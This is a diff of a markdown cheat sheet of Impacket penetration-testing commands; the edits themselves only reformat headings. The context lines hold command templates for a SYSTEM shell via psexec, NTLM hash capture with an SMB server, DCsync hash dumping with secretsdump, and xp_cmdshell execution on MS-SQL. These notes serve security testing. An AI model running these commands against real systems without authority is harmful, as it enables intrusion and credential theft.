@@ -1,5 +1,8 @@
 
-Impackets is an invaluable library of python-based exploitation tools.  The library also reuses a lot of authentication methods and syntax, so in a lot of cases you can get away with simply changing the specific impacket command being ran without needing to change any parameters.
+## Overview
+---
+
+**Impacket** is an invaluable library of python-based exploitation tools.  The library also reuses a lot of authentication methods and syntax, so in a lot of cases you can get away with simply changing the specific impacket command being ran without needing to change any parameters.
 
 On Kali Linux, the impacket library is in your path by default and each python script is prefaced with "impacket-" for more intuitive usage.
 
@@ -11,7 +14,7 @@ python3 psexec.py <domain>/<username>:'<password'@<target>
 impacket-psexec <domain>/<username>:'<password'@<target>
 ```
 
-### impacket-smbserver
+## impacket-smbserver
 ---
 Create a simple unauthenticated SMB server that can host files and capture the NTLM hash of visitors.
 
@@ -26,7 +29,7 @@ impacket-smbserver <share_name> -smb2support <path_to_serve>
 # \\<ip_addr>\<share_name>\<hosted_files>
 ```
 
-### impacket-smbclient
+## impacket-smbclient
 ---
 Connect to a workstation via SMB and attempt to interact with with available shares. (Requirements: Valid user credentials.)
 
@@ -51,7 +54,7 @@ impacket-smbclient <domain>/<username>@<target> -k -no-pass
 # Return Host Information     : info
 ```
 
-### impacket-psexec
+## impacket-psexec
 ---
 Acquire a SYSTEM level shell via exploiting write privileges in the default ADMIN$ share. (Requirements: Credentials for a user with SMB write privileges to the ADMIN$ share.)
 
@@ -74,7 +77,7 @@ impacket-psxec <domain>/<username>:'<password>'@<target> '<command_to_execute>'
 # Upload Files to Temp Directory : lput <local_file> Temp
 ```
 
-### impacket-secretsdump
+## impacket-secretsdump
 ---
 Perform a DCsync attack on a Domain Controller and dump all user and machine hashes within the domain. (Requirements: Domain Administrator Privileges)
 
@@ -90,7 +93,7 @@ export KRB5CCNAME=/path/to/<krb5cc_ticket>
 impacket-secretsdump <domain>/<domain_admin>@<target_dc> -k -no-pass > <outfile.txt>
 ```
 
-### impacket-mssqlclient
+## impacket-mssqlclient
 ---
 Connect to a MS-SQL database. (Requirements: Valid DB user credentials.)
 
@@ -109,5 +112,5 @@ impacket-mssqlclient sa:'poiuytrewq'@<target>
 > xp_cmdshell '<command>'
 ```
 
-### impacket-addcomputer
+## impacket-addcomputer
 ---
